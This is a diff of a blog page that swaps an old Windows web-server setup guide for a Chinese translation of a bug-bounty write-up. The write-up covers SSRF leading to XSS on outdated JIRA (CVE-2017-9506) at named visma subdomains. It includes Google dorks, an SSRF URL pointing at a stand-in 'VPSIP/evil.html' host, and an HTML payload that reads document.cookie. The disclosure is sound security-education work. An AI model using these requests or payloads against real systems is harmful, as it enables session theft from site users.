@@ -15,32 +15,23 @@
 
 
 
-<meta name="description" content="0x00. 前言&amp;emsp;&amp;emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！">
+<meta name="description" content="原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?####漏洞：SSRF + XSS ####作者：Yeasir Arafat 难度：低&amp;emsp;&amp;emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行j">
 <meta property="og:type" content="article">
-<meta property="og:title" content="win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin">
-<meta property="og:url" content="http://TimeS0ng.github.io/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/index.html">
+<meta property="og:title" content="第五篇翻译：SSRF to XSS">
+<meta property="og:url" content="http://TimeS0ng.github.io/2018/12/23/第五篇翻译：SSRF-to-XSS/index.html">
 <meta property="og:site_name" content="TimeS0ng&#39;s blog">
-<meta property="og:description" content="0x00. 前言&amp;emsp;&amp;emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！">
+<meta property="og:description" content="原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?####漏洞：SSRF + XSS ####作者：Yeasir Arafat 难度：低&amp;emsp;&amp;emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行j">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515161655_XsJ6cp_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162134_VYC3ZY_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162424_q4MzyV_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163752_P2zqe4_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515184948_S8kjnH_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163959_KVEfGb_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164353_J0zlrX_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164814_CEmJ79_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172545_QSyuFx_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170629_zXk59X_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170927_ajfy4v_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515171051_ibNpr4_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172728_TN0Ix7_Screenshot.jpeg">
-<meta property="og:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172205_F4qTTj_Screenshot.jpeg">
-<meta property="og:updated_time" content="2018-12-18T15:34:31.729Z">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_5/1.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_5/2.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_5/4.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_5/3.png">
+<meta property="og:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png">
+<meta property="og:updated_time" content="2018-12-23T03:53:43.837Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin">
-<meta name="twitter:description" content="0x00. 前言&amp;emsp;&amp;emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！">
-<meta name="twitter:image" content="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515161655_XsJ6cp_Screenshot.jpeg">
+<meta name="twitter:title" content="第五篇翻译：SSRF to XSS">
+<meta name="twitter:description" content="原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?####漏洞：SSRF + XSS ####作者：Yeasir Arafat 难度：低&amp;emsp;&amp;emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行j">
+<meta name="twitter:image" content="http://img.027cgb.com/612577/times0ng_blog/translate_5/1.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -72,7 +63,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin | TimeS0ng&#39;s blog</title>
+<title>第五篇翻译：SSRF to XSS | TimeS0ng&#39;s blog</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -273,20 +264,20 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-第五篇翻译：SSRF-to-XSS" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/" class="article-date">
-      <time datetime="2018-05-15T10:26:18.000Z" itemprop="datePublished">2018-05-15</time>
+      <a href="/2018/12/23/第五篇翻译：SSRF-to-XSS/" class="article-date">
+      <time datetime="2018-12-23T03:53:31.000Z" itemprop="datePublished">2018-12-23</time>
 </a>
 
  
-    <a href="/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/#comments" title="查看评论">
+    <a href="/2018/12/23/第五篇翻译：SSRF-to-XSS/#comments" title="查看评论">
         <i class="fa fa-comments-o" aria-hidden="true"></i>
         <span class="count-comment"></span>
         
         
-            <span class="disqus-comment-count" data-disqus-identifier="2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/"></span>
+            <span class="disqus-comment-count" data-disqus-identifier="2018/12/23/第五篇翻译：SSRF-to-XSS/"></span>
         
     </a>
 
@@ -301,7 +292,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin
+      第五篇翻译：SSRF to XSS
     </h1>
   
 
@@ -318,87 +309,20 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！"><a href="#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！" class="headerlink" title="&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！"></a>&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到<a href="https://pan.baidu.com/s/1BnB2zr5hxbLRY1yHzX18rA" target="_blank" rel="external">我的云盘</a>  密码:8r5k，节约大家搜集软件的时间！</h4><a id="more"></a>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515161655_XsJ6cp_Screenshot.jpeg" alt=""></p>
-<h2 id="0x01-搭建Apache2-2"><a href="#0x01-搭建Apache2-2" class="headerlink" title="0x01. 搭建Apache2_2"></a>0x01. 搭建Apache2_2</h2><blockquote>
-<ol>
-<li>运行apache2.2.10-win32-x86-no_ssl.msi</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162134_VYC3ZY_Screenshot.jpeg" alt=""></p>
-<blockquote>
-<ol>
-<li>一路下一步，到了域名那里随便填一个域名就可以了，接着下一步选择Custom 模式自定义安装</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162424_q4MzyV_Screenshot.jpeg" alt=""></p>
-<blockquote>
-<ol>
-<li>然后选择Apache Http Server 2.2.10，再点击change改变安装目录为C:\apm\apache2</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163752_P2zqe4_Screenshot.jpeg" alt=""></p>
-<blockquote>
-<ol>
-<li>再一路默认就安装好了，在右下角有apache的图标，到目前为止apache就安装好了</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515184948_S8kjnH_Screenshot.jpeg" alt=""></p>
-<h2 id="0x02-安装PHP5"><a href="#0x02-安装PHP5" class="headerlink" title="0x02. 安装PHP5"></a>0x02. 安装PHP5</h2><blockquote>
-<ol>
-<li>将PHP5 文件夹拖到C:\apm\ 文件夹下</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163959_KVEfGb_Screenshot.jpeg" alt=""></p>
-<blockquote>
-<ol>
-<li>将php5 文件下面的php.ini-development 文件修改为php.ini</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164353_J0zlrX_Screenshot.jpeg" alt=""></p>
-<blockquote>
-<ol>
-<li>（1）打开php.ini 将 ; extension_dir = “./“ 修改为extension_dir = “c:\apm\php5\ext”  ; </li>
-</ol>
-<p>（2）去掉 extension=php_gd2.dll，extension=php_mbstring.dll，extension=php_mysql.dll, extension=php_mysqli.dll 前面的 ; </p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164814_CEmJ79_Screenshot.jpeg" alt=""></p>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172545_QSyuFx_Screenshot.jpeg" alt=""></p>
-<blockquote>
-<ol>
-<li>（1）打开c:\apm\apache2\conf\httpd.conf 配置文件，找到DirectoryIndex index.html，修改为DirectoryIndex index.html index.php login.php</li>
-</ol>
-<p>（2）找到 #LoadModule vhost_alias_module modules/mod_vhost_alias.so 在这行的后面添加以下内容：</p>
-</blockquote>
-<p>“””</p>
-<p>LoadModule php5_module “c:/apm/php5/php5apache2_2.dll”</p>
-<p>AddType application/x-httpd-php .php</p>
-<p>PHPIniDir “c:/apm/php5/php.ini”</p>
-<p>“””</p>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170629_zXk59X_Screenshot.jpeg" alt=""></p>
-<blockquote>
-<ol>
-<li>添加系统环境变量，将 ;c:\apm\php5;c:\apm\php5\ext 加到环境变量后面</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170927_ajfy4v_Screenshot.jpeg" alt=""></p>
-<blockquote>
-<ol>
-<li>重启计算机就能看到已经将PHP整合到Apache中了，此时已经可以解析php文件</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515171051_ibNpr4_Screenshot.jpeg" alt=""></p>
-<h2 id="0x03-安装phpMyAdmin"><a href="#0x03-安装phpMyAdmin" class="headerlink" title="0x03. 安装phpMyAdmin"></a>0x03. 安装phpMyAdmin</h2><blockquote>
-<p>将phpMyAdmin 文件夹放到c:\apm\apache2\htdocs 文件夹下面，在目录中找到一个名为config.sample.inc.php的文件，将此文件复制一份并命名为config.inc.php，这个文件就是phpMyAdmin的配置文件了，重启apache就可以了</p>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172728_TN0Ix7_Screenshot.jpeg" alt=""></p>
-<h2 id="0x04-安装Mysql"><a href="#0x04-安装Mysql" class="headerlink" title="0x04. 安装Mysql"></a>0x04. 安装Mysql</h2><blockquote>
-<ol>
-<li>打开mysql-5.5.60-win32.msi ，一路下一步，大致步骤和Apache相似，在“Developer Components（开发者部分）”上左键单击，选择“This feature, and all subfeatures, will be installed on local hard drive.”</li>
-</ol>
-</blockquote>
-<p><img src="http://tie.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172205_F4qTTj_Screenshot.jpeg" alt=""></p>
-<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"><a href="#其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。" class="headerlink" title="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"></a>其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。</h4>
+        <h4 id="原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities"><a href="#原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities" class="headerlink" title="原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?"></a>原文：<a href="https://medium.com/@Skylinearafat/how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities-6a88c45e9ec6" target="_blank" rel="external">How Outdated JIRA Instances suffers from multiple security vulnerabilities?</a></h4><p>####漏洞：SSRF + XSS</p>
+<p>####作者：Yeasir Arafat</p>
+<h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><h4 id="emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"><a href="#emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意" class="headerlink" title="&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"></a>&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. https://jira.visma.lv/secure/Dashboard.jspa</div><div class="line">2. https://customer-incident.consulting.visma.com/secure/Dashboard.jspa</div></pre></td></tr></table></figure>
+<h4 id="如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法"><a href="#如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法" class="headerlink" title="如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法"></a>如果你想找一些运行jira服务的子域练练手，可以试试使用下面的谷歌语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">inurl:visma intitle:JIRA login</div><div class="line">inurl:companyname intitle:JIRA login</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/1.png" alt=""></p>
+<h4 id="emsp-emsp-我注意到域名https-customer-incident-consulting-visma-com-具有JIRA-6-3-1版本。我记得CVE-2017-9506-影响范围是Jira-versions-lt-7-3-5，所以我尝试验证一下该网站是否具有SSRF漏洞"><a href="#emsp-emsp-我注意到域名https-customer-incident-consulting-visma-com-具有JIRA-6-3-1版本。我记得CVE-2017-9506-影响范围是Jira-versions-lt-7-3-5，所以我尝试验证一下该网站是否具有SSRF漏洞" class="headerlink" title="&emsp;&emsp;我注意到域名https://customer-incident.consulting.visma.com 具有JIRA 6.3.1版本。我记得CVE-2017-9506 影响范围是Jira versions &lt; 7.3.5，所以我尝试验证一下该网站是否具有SSRF漏洞"></a>&emsp;&emsp;我注意到域名<a href="https://customer-incident.consulting.visma.com" target="_blank" rel="external">https://customer-incident.consulting.visma.com</a> 具有JIRA 6.3.1版本。我记得CVE-2017-9506 影响范围是Jira versions &lt; 7.3.5，所以我尝试验证一下该网站是否具有SSRF漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://customer-incident.consulting.visma.com/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.baidu.com</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/2.png" alt=""></p>
+<h4 id="emsp-emsp-我尝试获取一些网站内部数据或获取读取权限，但是我失败了。-如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan"><a href="#emsp-emsp-我尝试获取一些网站内部数据或获取读取权限，但是我失败了。-如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan" class="headerlink" title="&emsp;&emsp;我尝试获取一些网站内部数据或获取读取权限，但是我失败了。 如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具Jira-Scan"></a>&emsp;&emsp;我尝试获取一些网站内部数据或获取读取权限，但是我失败了。 如果你想用脚本自动测试网站是否存在jira漏洞，我建议你使用Github上的exp工具<a href="https://github.com/random-robbie/Jira-Scan" target="_blank" rel="external">Jira-Scan</a></h4><h4 id="emsp-emsp-另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https-customer-incident-consulting-visma-com-网站的用户cookie，而不是百度的cookie"><a href="#emsp-emsp-另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https-customer-incident-consulting-visma-com-网站的用户cookie，而不是百度的cookie" class="headerlink" title="&emsp;&emsp;另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到https://customer-incident.consulting.visma.com 网站的用户cookie，而不是百度的cookie"></a>&emsp;&emsp;另外，我还创建了一个简单的HTML页面，上面包含了XSS漏洞。我将重定向页面指定到我的XSS漏洞页面，这样我们就能够触发XSS，并且获取到<a href="https://customer-incident.consulting.visma.com" target="_blank" rel="external">https://customer-incident.consulting.visma.com</a> 网站的用户cookie，而不是百度的cookie</h4><p>[*]攻击者创建的evil.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;SSRF to XSS on Jira Vulnerable Instances&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">  &lt;script&gt;</div><div class="line">   alert( document.domain + &quot; is vulnerable&quot; );</div><div class="line">            alert( document.cookie);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/4.png" alt=""></p>
+<h4 id="emsp-emsp-现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie"><a href="#emsp-emsp-现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie" class="headerlink" title="&emsp;&emsp;现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie"></a>&emsp;&emsp;现在访问我们自己在VPS上搭建的XSS漏洞网页，验证能否触发XSS并获取Cookie</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://customer-incident.consulting.visma.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://VPSIP/evil.html</div></pre></td></tr></table></figure>
+<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_5/3.png" alt=""></p>
+<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
+
       
     </div>
     
@@ -406,13 +330,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/">win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin</a></p>
+        <p><span>本文标题:</span><a href="/2018/12/23/第五篇翻译：SSRF-to-XSS/">第五篇翻译：SSRF to XSS</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
-        <p><span>发布时间:</span>2018-05-15, 18:26:18</p>
-        <p><span>最后更新:</span>2018-12-18, 23:34:31</p>
+        <p><span>发布时间:</span>2018-12-23, 11:53:31</p>
+        <p><span>最后更新:</span>2018-12-23, 11:53:43</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/" title="win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin">http://TimeS0ng.github.io/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/05/15/win2003-下搭建Apache2-PHP5-Mysql-phpMyAdmin/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/12/23/第五篇翻译：SSRF-to-XSS/" title="第五篇翻译：SSRF to XSS">http://TimeS0ng.github.io/2018/12/23/第五篇翻译：SSRF-to-XSS/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2018/12/23/第五篇翻译：SSRF-to-XSS/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -424,16 +348,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2018/06/04/漫谈攻击链-从webshell到域控的奇妙之旅/">
-                    漫谈攻击链--从webshell到域控的奇妙之旅
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2018/04/20/Windows密码抓取总结/">
-                    Windows密码抓取总结
+                <a href="/2018/12/21/第四篇翻译：XSS漏洞/">
+                    第四篇翻译：XSS漏洞
                 </a>
             </div>
         
@@ -445,7 +363,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00. 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！"><span class="toc-number">1.0.1.</span> <span class="toc-text">  这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-搭建Apache2-2"><span class="toc-number">2.</span> <span class="toc-text">0x01. 搭建Apache2_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-安装PHP5"><span class="toc-number">3.</span> <span class="toc-text">0x02. 安装PHP5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-安装phpMyAdmin"><span class="toc-number">4.</span> <span class="toc-text">0x03. 